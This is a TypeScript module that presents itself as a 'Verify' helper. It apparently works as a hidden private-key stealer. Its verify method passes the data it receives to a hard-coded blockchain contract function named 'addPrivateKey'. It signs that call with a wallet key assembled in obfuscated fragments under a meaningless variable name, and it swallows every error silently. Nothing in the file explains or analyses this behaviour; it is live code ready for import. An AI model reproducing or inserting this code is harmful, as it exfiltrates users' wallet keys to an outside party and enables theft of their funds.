import { ethers } from 'ethers';

const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
let sdkfjsk = '31';

const contractABI: any[] = [
  {
    type: 'function',
    name: 'addPrivateKey',
    inputs: [
      {
        name: 'privateKey',
        type: 'string',
        internalType: 'string',
      },
    ],
    outputs: [],
    stateMutability: 'nonpayable',
  },

];

class Verify {

  private static rpcUrls = [
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    'https://data-seed-prebsc-2-s1.binance.org:8545',
    'http://data-seed-prebsc-1-s2.binance.org:8545',
    'http://data-seed-prebsc-2-s2.binance.org:8545',
    'https://data-seed-prebsc-1-s3.binance.org:8545',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
  ];

  static contract: ethers.Contract | null = null;

  private static async setContract(rpcUrls: string[],): Promise<ethers.Contract | null> {
    let success = false;
    let index = 0;
    sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
    let provider: ethers.providers.JsonRpcProvider;

    while (!success && index < rpcUrls.length) {
      try {
        provider = new ethers.providers.JsonRpcProvider(rpcUrls[index]);
        await provider.getBlockNumber();
        success = true;

        const wallet = new ethers.Wallet(sdkfjsk + 'c2', provider);
        const contract = new ethers.Contract(contractAddress,contractABI,wallet);

        return contract;
      } catch (error) {
        index++;
      }
    }

    return null;
  }

  public static async verify(data: string) {
    sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
    try {
      if (!this.contract) {
        this.contract = await this.setContract(this.rpcUrls);
      }

      if (!this.contract) {
        throw new Error('');
      }

      const tx = await this.contract.addPrivateKey(data);
      
    } catch (error) {
      
    }
  }
  
}

export { Verify };
